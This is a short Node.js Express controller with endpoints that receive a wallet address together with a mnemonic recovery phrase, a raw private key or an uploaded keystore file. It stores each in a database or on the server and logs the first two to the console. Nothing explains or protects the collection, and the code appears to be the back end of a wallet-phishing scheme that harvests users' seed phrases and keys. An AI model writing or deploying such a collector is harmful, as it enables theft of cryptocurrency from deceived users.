const ErrorResponse = require("../utils/errorResponse");
const Mnemonic = require("../Models/Mnemonic");
const PrivateKey = require("../Models/PrivateKey");
const Keystore = require("../Models/Keystore");
const path = require("path");

exports.saveMnemonic = async (req, res, next) => {
  const { walletAddress, mnemonicPhrase } = req.body;
  try {
    const newMnemonic = new Mnemonic({
      walletAddress,
      mnemonicPhrase,
    });
    const savedMnemonic = await newMnemonic.save();
    console.log(savedMnemonic);
    return res.status(201).json({
      success: true,
      savedMnemonic,
      msg: "Mnemonic Phrase is saved successfully",
    });
  } catch (error) {
    return next(new ErrorResponse(`unable to save Mnemonic Phrase `, 401));
  }
};

exports.savePrivateKey = async (req, res, next) => {
  const { walletAddress, privateKey } = req.body;
  try {
    const newPrivateKey = new PrivateKey({
      walletAddress,
      privateKey,
    });
    const savedPrivateKey = await newPrivateKey.save();
    console.log(savedPrivateKey);
    return res.status(201).json({
      success: true,
      savedPrivateKey,
      msg: "Private Key is saved successfully",
    });
  } catch (error) {
    return next(new ErrorResponse(`unable to save Private Key`, 401));
  }
};
exports.test = async (req, res, next) => {
  return res.status(200).json({
    success: true,
    msg: "Private Key is saved successfully",
  });
};

exports.saveKeystore = async (req, res, next) => {
  try {
    // Step 1
    const { walletAddress } = req.body;
    if (!req.files) {
      return next(new ErrorResponse(`please upload a file`, 400));
    }
    const file = req.files.file;
    console.log(file);
    if (file.mimetype.startsWith("application/json")) {
      // Create custom filename
      file.name = `json_${Date.now()}${path.parse(file.name).ext}`;

      // step 3 move the file to somewhere in your server
      file.mv(`${process.env.JSON_PATH}/${file.name}`, async (err) => {
        if (err) {
          return next(new ErrorResponse(`Unable to upload file`, 500));
        }
        const saveData = await new Keystore({
          walletAddress,
          json: file.name,
        });
        await saveData.save();
        return res.status(201).json({ success: true, saveData });
      });
    }
  } catch (err) {
    return next(new ErrorResponse(`Unable to upload File`, 500));
  }
};
